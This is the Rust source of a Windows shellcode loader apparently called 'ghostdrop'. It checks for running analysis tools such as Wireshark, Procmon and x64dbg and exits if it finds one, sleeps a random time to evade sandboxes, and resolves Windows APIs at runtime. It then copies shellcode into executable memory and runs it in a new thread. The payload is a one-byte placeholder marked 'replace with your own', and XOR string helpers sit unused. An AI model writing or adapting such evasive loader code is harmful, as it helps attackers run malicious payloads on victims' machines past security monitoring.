use clap::Parser;
use std::ptr;
use std::thread;
use std::time::Duration;
use winapi::um::memoryapi::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::processthreadsapi::{CreateThread, WaitForSingleObject};
use winapi::um::winnt::{HANDLE, INFINITE, LPVOID, SIZE_T, DWORD, BOOL};
use winapi::um::winbase::{GetModuleHandleA, GetProcAddress};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32W};
use winapi::um::psapi::{EnumProcessModules, GetModuleBaseNameW};
use winapi::um::sysinfoapi::{GetSystemInfo, SYSTEM_INFO};
use winapi::um::winreg::{HKEY_LOCAL_MACHINE, KEY_READ, RegOpenKeyExA, RegQueryValueExA};
use rand::Rng;
use std::ffi::CString;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Run in test mode (skip shellcode execution)
    #[arg(short, long)]
    test: bool,
    
    /// Sleep time in seconds before execution (randomized)
    #[arg(short, long, default_value = "5")]
    sleep: u64,
}

// Encrypted strings using XOR encryption
fn xor_encrypt(input: &str) -> Vec<u8> {
    let key = 0x42;
    input.bytes().map(|b| b ^ key).collect()
}

fn xor_decrypt(input: &[u8]) -> String {
    let key = 0x42;
    input.iter().map(|&b| (b ^ key) as char).collect()
}

// Dynamic API resolution
unsafe fn get_proc_address<T>(module: &str, proc: &str) -> Option<T> {
    let module_c = CString::new(module).unwrap();
    let proc_c = CString::new(proc).unwrap();
    
    let handle = GetModuleHandleA(module_c.as_ptr());
    if handle.is_null() {
        return None;
    }
    
    let addr = GetProcAddress(handle, proc_c.as_ptr());
    if addr.is_null() {
        return None;
    }
    
    Some(std::mem::transmute(addr))
}

// Sandbox detection
unsafe fn detect_sandbox() -> bool {
    // Check for common sandbox process names
    let sandbox_processes = [
        "wireshark.exe",
        "procmon.exe",
        "procmon64.exe",
        "tcpview.exe",
        "tcpview64.exe",
        "tcpvcon.exe",
        "tcpvcon64.exe",
        "wireshark.exe",
        "wireshark64.exe",
        "fiddler.exe",
        "fiddler64.exe",
        "httpdebugger.exe",
        "httpdebugger64.exe",
        "fakenet.exe",
        "fakenet64.exe",
        "sniff_hit.exe",
        "sniff_hit64.exe",
        "pestudio.exe",
        "pestudio64.exe",
        "processhacker.exe",
        "processhacker64.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "windbg.exe",
        "immunity debugger.exe",
        "wireshark.exe",
        "wireshark64.exe",
        "fiddler.exe",
        "fiddler64.exe",
        "httpdebugger.exe",
        "httpdebugger64.exe",
        "fakenet.exe",
        "fakenet64.exe",
        "sniff_hit.exe",
        "sniff_hit64.exe",
        "pestudio.exe",
        "pestudio64.exe",
        "processhacker.exe",
        "processhacker64.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "windbg.exe",
        "immunity debugger.exe",
    ];

    let snapshot = CreateToolhelp32Snapshot(2, 0);
    if snapshot == -1 {
        return false;
    }

    let mut pe32: PROCESSENTRY32W = std::mem::zeroed();
    pe32.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

    if Process32First(snapshot, &mut pe32) == 0 {
        return false;
    }

    loop {
        let process_name = String::from_utf16_lossy(&pe32.szExeFile)
            .trim_matches('\0')
            .to_lowercase();
        
        if sandbox_processes.iter().any(|&p| process_name.contains(p)) {
            return true;
        }

        if Process32Next(snapshot, &mut pe32) == 0 {
            break;
        }
    }

    false
}

fn main() {
    // Parse command line arguments
    let args = Args::parse();

    // Example shellcode (replace with your own)
    let shellcode: [u8; 1] = [0x90]; // NOP sled as placeholder

    if args.test {
        println!("ghostdrop test mode: shellcode not executed");
        return;
    }

    // Anti-detection measures
    unsafe {
        // Check for sandbox
        if detect_sandbox() {
            eprintln!("Sandbox detected! Exiting...");
            return;
        }

        // Random sleep to evade sandbox detection
        let mut rng = rand::thread_rng();
        let sleep_time = rng.gen_range(1..=args.sleep);
        thread::sleep(Duration::from_secs(sleep_time));

        // Dynamic API resolution
        type VirtualAllocType = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
        type CreateThreadType = unsafe extern "system" fn(LPVOID, SIZE_T, Option<unsafe extern "system" fn(LPVOID) -> DWORD>, LPVOID, DWORD, *mut DWORD) -> HANDLE;
        type WaitForSingleObjectType = unsafe extern "system" fn(HANDLE, DWORD) -> DWORD;

        let virtual_alloc: VirtualAllocType = get_proc_address("kernel32.dll", "VirtualAlloc")
            .expect("Failed to resolve VirtualAlloc");
        
        let create_thread: CreateThreadType = get_proc_address("kernel32.dll", "CreateThread")
            .expect("Failed to resolve CreateThread");
        
        let wait_for_single_object: WaitForSingleObjectType = get_proc_address("kernel32.dll", "WaitForSingleObject")
            .expect("Failed to resolve WaitForSingleObject");

        // Allocate memory for shellcode
        let addr = virtual_alloc(
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if addr.is_null() {
            eprintln!("Failed to allocate memory");
            return;
        }

        // Copy shellcode to allocated memory
        ptr::copy_nonoverlapping(
            shellcode.as_ptr() as *const u8,
            addr as *mut u8,
            shellcode.len(),
        );

        // Create thread to execute shellcode
        let thread = create_thread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(addr)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        if thread.is_null() {
            eprintln!("Failed to create thread");
            return;
        }

        // Wait for thread to finish
        wait_for_single_object(thread, INFINITE);
    }
} 